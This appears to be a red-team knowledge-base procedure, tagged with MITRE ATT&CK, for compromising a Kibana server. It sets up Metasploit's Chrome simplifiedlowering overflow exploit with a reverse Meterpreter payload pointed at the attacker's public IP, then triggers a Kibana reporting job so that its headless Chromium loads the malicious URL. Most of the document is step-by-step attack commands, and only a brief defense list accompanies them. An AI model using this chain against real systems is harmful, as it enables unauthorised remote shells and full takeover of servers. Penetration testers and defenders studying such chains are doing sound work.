---
tags:
  - metasploit
  - reverse-shell
  - reporting-job
type: procedure
tools:
  - '[[tools/headless_shell]]'
  - '[[tools/Metasploit]]'
  - '[[tools/Python-SimpleHTTPServer]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
platforms:
  - Linux
  - Elastic Cloud
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: f3265941-3c10-4391-82da-7923e35d9201
created_at: '2025-12-11T03:47:47.802Z'
updated_at: '2025-12-11T03:47:47.802Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
---
# Configure Metasploit and Trigger Reporting Job for Reverse Shell

## Summary

This procedure configures Metasploit to serve a Chrome exploit payload and triggers a Kibana reporting job to load it, achieving a reverse Meterpreter shell.

## Description

By setting up the exploit module in Metasploit and configuring Kibana to redirect to the malicious URL, a reporting job (e.g., PDF generation) loads the payload, exploiting the vulnerable Chromium for full compromise.

## Requirements

1. Metasploit installed
2. Public IP for listener
3. Access to modify kibana.yml and trigger reporting jobs

## Defense

Defensive measures and detection strategies:

- Patch Kibana and Chromium vulnerabilities
- Monitor reporting jobs for suspicious URLs
- Use network segmentation to prevent outbound shells

## Objectives

1. Establish reverse shell
2. Achieve full system access
3. Demonstrate chained exploitation

## Instructions

### Step 1: Select Exploit Module

**Context**: Load the Chrome exploit in Metasploit.

**Command** ([[commands/msf-use-exploit]]):
```bash
use exploit/multi/browser/chrome_simplifiedlowering_overflow
```

> Selects the module for the overflow vulnerability.

### Step 2: Set Target

**Context**: Configure the exploit target.

**Command** ([[commands/msf-set-target]]):
```bash
set target 0
```

> Sets the default target.

### Step 3: Set Payload

**Context**: Choose the reverse shell payload.

**Command** ([[commands/msf-set-payload]]):
```bash
set payload 5
```

> Configures Meterpreter payload.

### Step 4: Set URI Path

**Context**: Define the exploit server path.

**Command** ([[commands/msf-set-uripath]]):
```bash
set uripath /
```

> Sets root path.

### Step 5: Set Listener Host

**Context**: Specify the attacker's IP for reverse connection.

**Command** ([[commands/msf-set-lhost]]):
```bash
set lhost [your public ip]
```

> Sets LHOST.

### Step 6: Configure and Trigger Job

**Context**: Edit kibana.yml for redirects, then POST to /api/reporting/jobs to create a job loading the malicious URL.

> This triggers the reporting feature to exploit Chromium.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### Sub-Techniques

- None

## Commands Used

- [[commands/msf-use-exploit]]
- [[commands/msf-set-target]]
- [[commands/msf-set-payload]]
- [[commands/msf-set-uripath]]
- [[commands/msf-set-lhost]]

## Tools Used

- [[tools/Metasploit]]

## Tags

- metasploit
- reverse-shell
- reporting-job
